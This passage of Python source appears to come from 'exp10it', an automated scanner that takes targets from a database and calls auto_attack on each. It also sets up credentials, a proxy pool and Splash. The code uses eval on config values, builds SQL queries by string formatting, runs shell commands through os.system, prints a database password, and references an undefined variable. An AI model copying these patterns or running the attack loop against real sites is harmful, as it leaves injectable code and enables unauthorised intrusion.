    # 下面配置BingAPI用于获取旁站的需要
    # 不再用bing接口查询旁站，因为bing关闭这个接口了
    '''
    if re.search(r"bingapikey", content):
        pass
    else:
        print("please input your bing api key:")
        key = input()
        update_config_file_key_value(CONFIG_INI_PATH, 'default', 'bingapikey', "'" + key + "'")
    '''

    # 下面配置邮件通知相关口令
    if re.search(r"mailto", content):
        mailto = eval(get_key_value_from_config_file(
            CONFIG_INI_PATH, 'mail', 'mailto'))
    else:
        mailto = input("please input email address you want send to:")
        update_config_file_key_value(
            CONFIG_INI_PATH, 'mail', 'mailto', "'" + mailto + "'")
    if re.search(r"user", content):
        user = eval(get_key_value_from_config_file(
            CONFIG_INI_PATH, 'mail', 'user'))
    else:
        user = input("please input your email account:")
        update_config_file_key_value(
            CONFIG_INI_PATH, 'mail', 'user', "'" + user + "'")
    if re.search(r"password", content):
        password = eval(get_key_value_from_config_file(
            CONFIG_INI_PATH, 'mail', 'password'))
    else:
        password = input("please input your email account password:")
        update_config_file_key_value(
            CONFIG_INI_PATH, 'mail', 'password', "'" + password + "'")

    # 下面配置数据库相关设置
    config_file_abs_path = CONFIG_INI_PATH
    while 1:
        DB_SERVER = input("please input your database server addr:>")
        if check_string_is_ip(DB_SERVER) or check_string_is_domain(DB_SERVER):
            update_config_file_key_value(config_file_abs_path, 'default',
                                         'DB_SERVER', "'" + DB_SERVER + "'")
            break
        else:
            print("your input may not be a regular ip addr:(")
            continue
        print("DB_SERVER:" + DB_SERVER)

    DB_USER = input("please input your database username:>")
    update_config_file_key_value(
        config_file_abs_path, 'default', 'DB_USER', "'" + DB_USER + "'")
    print("DB_USER:" + DB_USER)

    DB_PASS = input("please input your database password:>")
    update_config_file_key_value(
        config_file_abs_path, 'default', 'DB_PASS', "'" + DB_PASS + "'")
    print("DB_PASS:" + DB_PASS)

    # 下面配置全局扫描中的每两次访问的时间间隔,DELAY参数
    if re.search(r"DELAY", content):
        pass
    else:
        print("please input your DELAY time (seconds) between every two requests [default 0]\n>")
        # 默认0s间隔
        DELAY= int(get_input_intime(0))
        update_config_file_key_value(
            config_file_abs_path, 'default', 'DELAY', int(DELAY))

    # 下面配置全局是否要求必须可连通google才工作,forcevpn参数
    if re.search(r"forcevpn", content):
        pass
    else:
        print("Do you want to work with vpn connected(can visit google)? \ninput 0 if you don't want,\ninput 1 if you want\n\
I suggest you input 1 unless you don't need cdn recgnization or don't care about the result of cdn recgnization")
        forcevpn = get_input_intime(1)
        if forcevpn != "0":
            update_config_file_key_value(
                config_file_abs_path, 'default', 'forcevpn', 1)
        else:
            update_config_file_key_value(
                config_file_abs_path, 'default', 'forcevpn', int(forcevpn))

    # 下面配置扫描是否为"强制询问cookie"模式
    # 强制询问cookie模式要求用户手动选择是否输入cookie
    # 非强制询问cookie模式不要求用户手动选择是否输入cookie,默认选择不输入cookie
    # 两种模式最终都是使用更新后的配置文件中的cookie
    print("请选择使用什么模式:\n0.非强制询问cookie模式\n(非强制询问cookie模式不要求用户手动选择是否输入cookie,默认选择不输入cookie)\n1.\
强制询问cookie模式\n(强制询问cookie模式要求用户手动选择是否输入cookie)\n\n两种模式最终都是使用更新后的配置文件中的cookie")
    print("请输入你的选择 0 for 1,default 0")
    forceAskCookie = get_input_intime(0)
    if forceAskCookie != "1":
        update_config_file_key_value(
            config_file_abs_path, 'default', 'forceAskCookie', 0)
    else:
        update_config_file_key_value(
            config_file_abs_path, 'default', 'forceAskCookie', int(forceAskCookie))


def start_ipproxypool():
    if not os.path.exists("IPProxyPool"):
        cmd="cd %s && git clone https://github.com/qiyeboy/IPProxyPool.git && pip install -r requirements.txt" % WORK_PATH
        input(cmd)
        os.system(cmd)
    else:
        cmd="cd %s && git pull" % (WORK_PATH+"/IPProxyPool")
        input(cmd)
        os.system(cmd)
    cmd="cd %s && nohup python2 IPProxy.py > IPProxyPool.log &" % (WORK_PATH+"/IPProxyPool")
    input(cmd)
    os.system(cmd)

def start_scrapy_splash():
    os.system("docker run -p 8050:8050 scrapinghub/splash")

def get_target_open_port_list(start_url):

    http_domain=get_http_domain_from_url(start_url)
    target_table_name = get_target_table_name_list(start_url)[0]
    result = execute_sql_in_db("select port_scan_info from %s where http_domain='%s'" %
                               (target_table_name, http_domain), "exp10itdb")
    open_port_list=[]
    if len(result) > 0:
        nmap_result_string = result[0][0]
        a = re.findall(r"(\d+)/(tcp)|(udp)\s+open", nmap_result_string, re.I)
        for each in a:
            if each[0] not in openPortList and each[0] not in COMMON_NOT_WEB_PORT_LIST:
                open_port_list.append(each[0])
    return open_port_list


def exp10itScanner():
    # 相当于扫描工具的main函数
    global DB_NAME
    global FIRST_TARGETS_TABLE_NAME
    global TARGETS_TABLE_NAME
    import os
    import warnings
    output = CLIOutput()
    warnings.filterwarnings('ignore', '.*have a default value.*')
    warnings.filterwarnings('ignore', '.*Data Truncated.*')
    scan_init()
    scan_way_init()
    database_init()
    while 1:
        target = get_one_target_from_db(DB_NAME,FIRST_TARGETS_TABLE_NAME)
        if target is None:
            target = get_one_target_from_db(DB_NAME,TARGETS_TABLE_NAME)
        if target is not None:
            output.good_print("get a target for scan from database:")
            output.good_print(Fore.BLUE + target)
            auto_attack(target)
        else:
            output.good_print("all targets scan finished")
            break
